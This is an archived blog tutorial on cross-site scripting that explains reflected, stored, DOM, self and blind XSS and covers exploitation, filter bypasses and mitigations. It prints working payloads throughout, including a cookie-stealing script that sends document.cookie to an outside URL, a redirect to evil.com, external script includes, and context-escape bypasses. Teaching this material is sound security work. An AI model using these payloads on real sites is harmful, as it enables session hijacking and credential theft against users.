# Deep Dive Into XSS

- **Source URL:** https://medium.com/@kavish2002ev3/deep-dive-into-xss-8420ddccc73b?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20240108211048/https://medium.com/@kavish2002ev3/deep-dive-into-xss-8420ddccc73b
- **Fetched:** 2026-11-24
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/4815 (id 4815)
- **Method:** wayback-machine-snapshot readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
# Deep Dive Into XSS

--

# Introduction:

The following blog post is all about one of the most commonly encountered web application vulnerabilities — XSS or Cross Site Scripting. The post consists of a detailed explanation of the vulnerability, its types, the methodology for exploitation, its impact, and steps for mitigation.

# Explanation:

Cross-Site Scripting is a vulnerability that usually occurs when a web application fails to validate and sanitize the user input. It allows the attacker to inject malicious scripts and payloads generally in the form of Javascript or HTML code.

It also allows the attacker to bypass the [Same Origin Policy(SOP)](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy#:~:text=The%20same%2Dorigin%20policy%20is,documents%2C%20reducing%20possible%20attack%20vectors.) designed to differentiate between websites.

The working basically results into the manipulation of the site which results into the malicious script execution.

*Ex:- https://target.com/post?title=\<script src=evil.js>\</script>*

The above payload calls for a script — evil.js which is then executed on the target site.

# Proof of concept:

We can check out for a XSS-vulnerable site by injecting javascript payloads in the user input fields. The most commonly used payload is:

*\<script>alert(1)\</script>*

The ‘alert()’ function is a commonly used and preferred payload for verifying a vulnerable site.

Other commonly used functions are:

- print()
- prompt()
- confirm()

# Types Of XSS Attacks:

1. Reflected XSS
2. Stored XSS
3. DOM-Based XSS
4. Self-XSS
5. Blind XSS

## Reflected XSS:

Also referred to as non-persistent XSS type, this type occurs when input is sent to a server within the current HTTP request and is then printed out immediately on the site in an unsafe fashion.

Ex: While visiting the forum site if the perpetrator injects the following query in the input: ***“\<script type=’text/javascript’>alert(‘vulnerable’);\</script>”*** the page displays a popup message with the text — ‘vulnerable’ then the perpetrator can verify that the page is vulnerable to reflected XSS and furthermore create a harmful payload for exploitation.

[https://portswigger.net/web-security/cross-site-scripting/reflected](https://portswigger.net/web-security/cross-site-scripting/reflected)

## **Stored XSS:**

Stored XSS occurs when a previously held malicious script is requested and the script is executed as an HTTP response in a harmful fashion.

One of the most frequent targets is the sites that allow users to share content like posts, video sharing platforms, social media feeds, etc.

Ex: While browsing through a social media site, the attacker can inject payloads in the comments sections of the posts uploaded. Later when the comments page is accessed the script gets executed to perform malicious activities.

The attacker can submit the following payload:

*\<p>Spectacular picture!\</p>*

*\<script src=exploit.js>\</script>*

The comment is published on the page and every time the visitor loads the page the malicious script gets executed.

[https://www.imperva.com/learn/application-security/cross-site-scripting-xss-attacks/](https://www.imperva.com/learn/application-security/cross-site-scripting-xss-attacks/)

## **DOM-Based XSS:**

DOM-Based XSS is generally encountered while manipulating the client’s browser environment. These rely on Document Object Model and are orchestrated on client side after loading the page. Here the webapp contains client-side javascript that processes data from an untrusted source in an unsafe way.

*var a = document.getElementById(‘search’).value;*

*var b = document.getElementById(‘results’);*

*results.innerHTML = ‘Your search’ + search;*

In the above code, the application uses some javascript to read the value from an input field and write that value to an element in HTML.

DOM-based XSS attacks can only be seen by checking the document object model and client-side scripts at runtime.

Fundamentally, attackers perform DOM-based Cross-site scripting attacks on applications with an executable path for data to travel from a source to a sink.

Sources are JavaScript properties that can act as the location of malicious input. These include document.URL, document.referrer, location.search, and location.hash among others.

A sink is a location or function that executes the malicious function in an HTML rendering. Example of sinks include: eval, setTimeout, setInterval and element.innerHTML among others.

## **DOM-XSS in jQuery:**

Few web applications use third party frameworks and libraries like jQuery, Angular, etc. Some of these are also potential sources and sinks for XSS. It is important to look out for sinks like attr() in jQuery as it changes the attribute of DOM tags and can be used to manipulate to execute an XSS attack.

Example:- *$(function() { (‘#submit’).attr(“value”, (new URLSearchParams(window.location.search)).get(‘returnUrl’)); });*

Here we have Javascript code that changes the value attribute of the button element using data from the URL.

We can then inject our payload in the URL parameter and click on the button to wait for execution.

## **DOM-XSS in AngularJS:**

If our application is using AngularJS framework than we can try injecting payloads in double curly braces rather than angle brackets. We can do this by going through the source code and looking out for attributes like ‘ng-app’ which are used in HTML elements.

Example:- *{{constructor.constructor(‘alert(1)’)()}}*

## **Self-XSS:**

Self-XSS involves a similar behavior as Reflected-XSS. It involves the concept of social engineering and requires the victim themself to insert an XSS payload from their respective browser. It is not triggered in conventional ways as the other varieties and has a low impact.

For instance:

If an attacker creates a malicious URL consisting of XSS payload and with the help of social engineering somehow delivers it to the victim and the victim accesses the link then that payload will get executed and the attacker can get access to the victim’s data.

## **Blind XSS:**

This vulnerability occurs when a web server stores the injected payload and later executes it in another component of the application or an entirely different application.

For instance:

When the attacker injects a payload in the feedback section or contact section of a website, later when the reviewer goes through the feedback submitted he can witness the execution of the payload. Here the script is executed in a different component of the application. Similarly, an attacker can execute a script in the administrative section of the web app.

# **Exploitation:**

There are several ways to exploit an XSS vulnerability.

Few are:

1. Stealing user cookies.
2. Open Redirection.
3. Website Defacement.

The attacker can insert a payload as “*\<script>new Image().src=”http://target.com/page.php?output=”+document.cookie****”;\</script>***”.

Here if the visitor loads the page with the malicious script then the attacker can get the user’s cookies which can be used to his/her advantage.

The attacker can redirect the victim to a malicious site by injecting a payload i.e. *“\<script>location.replace(“https://evil.com”)\</script>”*

You can further visit [https://workbook.securityboat.in/resources/web-app-pentest/cross-site-scripting-xss](https://workbook.securityboat.in/resources/web-app-pentest/cross-site-scripting-xss) for detailed exploitation methodology.

# **Other Bypasses (XSS contexts):**

A few websites blacklist some tags and functions like \<script>, alert(), and characters like \< and >. This is when figuring out the XSS context becomes important.

-> HTML tag attributes: If the XSS context is inside an HTML tag attribute value then we will first focus on terminating the attribute and closing the tag followed by our main script.

Example:- *“>\<img src=x onload=alert(1)>* or

*“>\</select>\<script>alert(document.domain)\</script>*

Here in the first payload, we have terminated the attribute value whereas, in the second one, we have also closed the select tag to escape out of the respected tag.

-> Filtering of brackets: Sometimes we won’t be able to exit out of an HTML tag as the angle brackets are blocked or encoded however, we are provided with the ability to break out of an attribute. In such a scenario what we can do is create a new attribute with event handlers.

Example:- *“ onload=alert(1) x=”*

*javascript:alert(document.cookies);*

In the above payload, an event handler called onload is used which would execute an alert popup box as the page is loaded in the browser. Finally the x=” part is written to complete the attribute markup and syntax.

-> Breaking out of Javascript string: It is often possible to break out of a Javascript string if the XSS context is inside a Javascript quoted literal string. We can then execute the Javascript directly.

Example:- *‘-confirm(document.domain)-’*

*‘;alert(document.cookies)//*

Sometimes applications don’t allow us to break out of a string by escaping the literal quote with a backslash. In such situations, we can try to escape out the backslash itself by using a backslash.

Example:- *\’prompt(‘hacked’)//*

The above-used payload gets converted to ***\\’prompt(‘hacked’)//*** by the application using backslash to escape quotes.

->Using HTML encoding: Whenever the XSS context is inside a Javascript with quoted attributes it is helpful to use HTML encoding for certain characters like \< and > or quotes.

Example: *'-alert(1)-'*

Here the server decodes the HTML-encoded entities further executing the alert function.

->XSS with template literals: Template literals are encapsulated in backticks then normal quotation marks and the expressions are represented using ${…..} syntax.

Example: *document.getElementById(‘search’).innerText=\`Hello ${user.fullname}\`;*

In such a case we can just embed an expression in ${} format rather than terminating the literal

I.e. *${alert(document.cookie)}*

For further reference on contexts and categories of payloads you can visit:

[https://cheatsheetseries.owasp.org/cheatsheets/XSS\_Filter\_Evasion\_Cheat\_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html)

## **Commonly used tools:**

- XSStrike
- BruteXSS
- XSSer
- XSSCrappy

# Impact:

The impact of XSS varies from one web application to another. It can result into session hijacking to credentials theft.

Here are some of the most common impacts associated with XSS:

- Session Hijacking
- Credential Theft
- Access Control Bypass
- Data Leakage

By exploiting a cross-site scripting vulnerability an attacker can impersonate a legitimate user and take over their account.

If a victim user has admin rights, it might lead to serious damage such as modifications in code and databases to further weaken the security of web applications.

**Mitigations:**

It is important to keep our systems safe and hack-proof them. Here we will take about general steps taken to secure our applications from XSS attacks.

**Encoding data:** User-controllable input should be encoded before it is written to the page.

For instance, characters like \< and > should be converted to HTML entities or Unicode entities. Base64 encoding scheme can also be used for inputs.

**Validating inputs:** User inputs are preferred to be validated before submitting the query.

**Whitelisting:** Creating a list of protocols and safe inputs is more efficient than blacklisting i.e. blocking all the harmful ones.
